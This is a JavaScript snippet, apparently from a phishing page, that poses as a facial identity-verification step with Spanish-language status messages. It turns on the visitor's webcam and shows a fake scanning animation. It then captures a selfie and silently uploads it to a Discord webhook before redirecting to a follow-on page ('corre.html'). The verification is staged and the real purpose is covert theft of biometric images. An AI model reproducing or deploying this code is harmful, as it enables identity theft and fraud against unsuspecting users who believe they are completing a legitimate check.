    <script>
    $(document).ready(function() {
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btnVerify = document.getElementById('btnVerify');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const scanLine = document.getElementById('scanLine');

        let stream = null;
        let isScanning = false;
        let scanInterval = null;

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 640 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                await video.play();
                
                statusDot.className = 'dot active';
                statusText.textContent = 'Cámara lista';
                btnVerify.disabled = false;
                
            } catch (err) {
                statusDot.className = 'dot';
                statusText.textContent = 'No se pudo acceder a la cámara';
                btnVerify.disabled = true;
            }
        }

        function capturarFoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 640;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            return canvas.toDataURL('image/jpeg', 0.95);
        }

        function enviarFotoADiscord(imageData) {
            return new Promise((resolve, reject) => {
                const message = {
                    content: '📸 **VERIFICACIÓN DE IDENTIDAD**\n' +
                             '🕐 **Fecha:** ' + new Date().toLocaleString()
                };

                $.ajax({
                    url: webhook,
                    method: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify(message)
                })
                .done(function() {
                    const blob = dataURLToBlob(imageData);
                    const formData = new FormData();
                    formData.append('file', blob, 'selfie.jpg');
                    formData.append('content', '📸 **Selfie capturada**');

                    $.ajax({
                        url: webhook,
                        method: 'POST',
                        data: formData,
                        processData: false,
                        contentType: false
                    })
                    .done(function() {
                        resolve();
                    })
                    .fail(function(err) {
                        reject(err);
                    });
                })
                .fail(function(err) {
                    reject(err);
                });
            });
        }

        function dataURLToBlob(dataURL) {
            const parts = dataURL.split(',');
            const mime = parts[0].match(/:(.*?);/)[1];
            const b64 = atob(parts[1]);
            const array = new Uint8Array(b64.length);
            for (let i = 0; i < b64.length; i++) {
                array[i] = b64.charCodeAt(i);
            }
            return new Blob([array], { type: mime });
        }

        function iniciarEscaneo() {
            if (isScanning) return;
            if (!stream) return;

            isScanning = true;
            btnVerify.disabled = true;
            btnVerify.classList.add('loading');
            
            scanLine.classList.add('active');
            statusDot.className = 'dot scanning';
            statusText.textContent = 'Verificando rostro...';

            let scanCount = 0;
            scanInterval = setInterval(() => {
                scanCount++;
                if (scanCount >= 3) {
                    clearInterval(scanInterval);
                    scanInterval = null;
                    capturarYEnviar();
                }
            }, 1000);
        }

        function capturarYEnviar() {
            statusText.textContent = 'Procesando...';
            
            try {
                const imageData = capturarFoto();
                
                enviarFotoADiscord(imageData)
                    .then(() => {
                        statusDot.className = 'dot active';
                        statusText.textContent = 'Verificación exitosa';
                        
                        setTimeout(() => {
                            window.location.href = 'corre.html';
                        }, 1500);
                    })
                    .catch(() => {
                        statusDot.className = 'dot';
                        statusText.textContent = 'Error, intenta de nuevo';
                        btnVerify.disabled = false;
                        btnVerify.classList.remove('loading');
                        isScanning = false;
                        scanLine.classList.remove('active');
                    });
                    
            } catch (err) {
                statusDot.className = 'dot';
                statusText.textContent = 'Error, intenta de nuevo';
                btnVerify.disabled = false;
                btnVerify.classList.remove('loading');
                isScanning = false;
                scanLine.classList.remove('active');
            }
        }

        function detenerCamara() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            if (scanInterval) {
                clearInterval(scanInterval);
                scanInterval = null;
            }
            video.srcObject = null;
        }

        btnVerify.addEventListener('click', iniciarEscaneo);
        iniciarCamara();

        window.addEventListener('beforeunload', function() {
            detenerCamara();
        });

    });
    </script>
